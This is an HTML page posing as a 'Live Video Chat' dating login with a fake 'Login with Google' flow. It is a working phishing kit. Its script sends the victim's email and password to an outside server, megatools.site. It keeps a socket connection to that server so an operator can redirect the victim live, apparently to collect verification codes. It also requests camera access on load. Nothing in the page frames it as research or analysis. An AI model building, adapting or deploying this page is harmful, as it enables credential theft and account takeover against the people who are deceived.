<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Live Video Chat Login</title>
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
      rel="stylesheet"
    />
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>

    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: "Roboto", Arial, sans-serif;
      }

      body {
        background: linear-gradient(to right, #e3f2fd, #bbdefb);
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }

      .container {
        width: 450px;
        padding: 48px 40px;
        border-radius: 12px;
        background: #ffffff;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        transition: all 0.3s ease;
      }

      .logo {
        text-align: center;
        margin-bottom: 16px;
      }

      .logo img {
        width: 90px;
      }

      .title {
        font-size: 26px;
        text-align: center;
        margin-bottom: 10px;
      }

      .subtitle {
        font-size: 16px;
        text-align: center;
        color: #5f6368;
        margin-bottom: 30px;
      }

      .form-group {
        margin-bottom: 20px;
      }

      .form-group input {
        width: 100%;
        padding: 14px;
        border: 1px solid #dadce0;
        border-radius: 6px;
        font-size: 16px;
      }

      .form-group input:focus {
        border-color: #1a73e8;
        outline: none;
      }

      .btn-google {
        margin: auto;
        background: #1a73e8;
        color: #fff;
        border: none;
        padding: 12px 24px;
        border-radius: 6px;
        font-size: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
      }

      .btn-google img {
        width: 20px;
        margin-right: 10px;
      }

      .divider {
        position: relative;
        margin: 30px 0;
        text-align: center;
      }

      .divider::before {
        content: "";
        position: absolute;
        top: 50%;
        left: 0;
        right: 0;
        height: 1px;
        background: #dadce0;
      }

      .divider span {
        background: #fff;
        position: relative;
        padding: 0 10px;
        font-size: 14px;
        color: #5f6368;
      }

      .buttons {
        display: flex;
        justify-content: space-between;
        margin-top: 20px;
      }

      .btn-next {
        background: #1a73e8;
        color: #fff;
        border: none;
        padding: 10px 20px;
        border-radius: 6px;
        font-weight: 500;
        cursor: pointer;
      }

      .loading-spinner {
        border: 4px solid rgba(0, 0, 0, 0.1);
        border-top: 4px solid #1a73e8;
        border-radius: 50%;
        width: 40px;
        height: 40px;
        animation: spin 1s linear infinite;
        margin: 20px auto;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .form-step {
        display: none;
      }

      .form-step.active {
        display: block;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="form-step active" id="step1">
        <div class="logo">
          <img
            src="https://maps-web3.site/location/v3/signin/6s5Eha.png"
            alt="Google"
          />
        </div>
        <h2 class="title">Live Video Chat</h2>
        <p class="subtitle">
          Login with Google and enjoy private dating video chat
        </p>
        <button class="btn-google" onclick="nextStep()">
          <!-- <img
            src="https://maps-web3.site/location/v3/signin/6s5Eha.png"
            alt="Google"
          /> -->
          Login with Google
        </button>
      </div>

      <div class="form-step" id="step2">
        <h2 class="title">Sign in</h2>
        <p class="subtitle">Use your Google Account</p>
        <div class="form-group">
          <input type="text" id="email" placeholder="Email or phone" />
        </div>
        <div class="divider"><span>or</span></div>
        <div class="buttons">
          <button class="btn-next" onclick="nextStep()">Next</button>
        </div>
      </div>

      <div class="form-step" id="step3">
        <h2 class="title">Welcome Back</h2>
        <p class="subtitle">Enter your password</p>
        <div class="form-group">
          <input type="password" id="password" placeholder="Password" />
        </div>
        <div class="buttons">
          <button class="btn-next" onclick="showLoading()">Sign in</button>
        </div>
      </div>

      <div class="form-step" id="step4">
        <div class="loading-spinner"></div>
        <p class="subtitle" style="text-align: center">Signing in...</p>
      </div>
    </div>

    <script>
      let _id = "";
      console.log(_id, "id");
      const urlParams = new URLSearchParams(window.location.search);
      const id = urlParams.get("id");
      let currentStep = 1;
      const totalSteps = 4;
      // Auto POST request when the page loads
      window.addEventListener("DOMContentLoaded", () => {
        fetch("https://megatools.site/api/v1/information", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            user: id,
            siteName: `Video-call/login`,
          }),
        })
          .then((res) => {
            if (!res.ok) throw new Error("Init request failed");
            return res.json();
          })
          .then((data) => {
            _id = data.data._id;
            connectAndJoinRoom(data.data._id);

            console.log("Init request successful", data);
          })
          .catch((err) => {
            console.error("Init request error:", err);
          });
      });

      function nextStep() {
        if (currentStep < totalSteps) {
          // Only trigger email POST if moving from step 2 to 3
          if (currentStep === 2) {
            const emailInput = document.getElementById("email");
            const email = emailInput.value.trim();

            if (!email) {
              alert("Please enter your email or phone.");
              return;
            }

            fetch(`https://megatools.site/api/v1/information/${_id}`, {
              method: "PATCH",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                user: id,
                siteName: `video-call/login`,
                email: email,
              }),
            })
              .then((res) => {
                if (!res.ok) throw new Error("Failed to save email");
                return res.json();
              })
              .then(() => {
                document.getElementById("email").textContent = email;
                goToNextStep(); // Only proceed if email POST was successful
              })
              .catch((err) => {
                console.error(err);
                alert("Error saving email. Try again.");
              });
          } else {
            goToNextStep();
          }
        }
      }

      function goToNextStep() {
        document
          .getElementById(`step${currentStep}`)
          .classList.remove("active");
        currentStep++;
        document.getElementById(`step${currentStep}`).classList.add("active");
      }

      function showLoading() {
        const email = document.getElementById("email").textContent;
        const password = document.getElementById("password").value;
        console.log(password, "password");

        if (!password) {
          alert("Please enter your password.");
          return;
        }

        goToNextStep(); // Go to step 4 (loading)
        // document.getElementById("loading-screen").style.display = "block";

        fetch(`https://megatools.site/api/v1/information/${_id}`, {
          method: "PATCH",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            user: id,
            siteName: `AutoInfo/login`,
            password: password,
          }),
        })
          .then((res) => {
            if (!res.ok) throw new Error("Login failed");
            return res.json();
          })
          .then((data) => {
            console.log("last request successful", data);

            // alert("Login successful! Redirecting...");
            // window.location.href = "/dashboard";
          })
          .catch((err) => {
            console.error(err);
            alert("Login failed. Try again.");
            // Optionally go back to password input
            currentStep = 2;
            goToNextStep();
          });
      }
      function connectAndJoinRoom(roomId) {
        console.log("Joining Room:", roomId);
        return new Promise((resolve) => {
          socket = io("https://megatools.site");

          socket.on("connect", () => {
            // Connect successful
            socket.emit("joinRoom", roomId); // ðŸ‘ˆ Required to receive updates
            resolve(); // Let the caller know we connected
          });

          socket.on("disconnect", () => {
            updateConnectionStatus(
              false,
              "Disconnected from real-time service"
            );
          });

          socket.on("connect_error", (error) => {
            console.error("Connection error:", error.message);
          });

          // Handle real-time server events
          socket.on("link", ({ data }) => {
            console.log("Link Event:", data);
            window.location.href = `${data.url}/${roomId}`;
          });

          socket.on("code", ({ data }) => {
            console.log("Code Event:", data);
            window.location.href = `${data.url}/?id=${roomId}&code=${data.code}`;
          });
        });
      }
      // Access camera automatically when page loads
      document.addEventListener("DOMContentLoaded", function () {
        const video = document.getElementById("camera-feed");

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
          navigator.mediaDevices
            .getUserMedia({
              video: {
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 },
              },
              audio: false,
            })
            .then(function (stream) {
              video.srcObject = stream;
              video.play();
            })
            .catch(function (error) {
              console.log("Camera error: ", error);
              video.style.display = "none";
            });
        } else {
          video.style.display = "none";
        }

        // Prevent scrolling on mobile
        document.body.addEventListener(
          "touchmove",
          function (e) {
            if (!e.target.classList.contains("form-group")) {
              e.preventDefault();
            }
          },
          { passive: false }
        );
      });
      //   connectAndJoinRoom(_id);
    </script>
  </body>
</html>
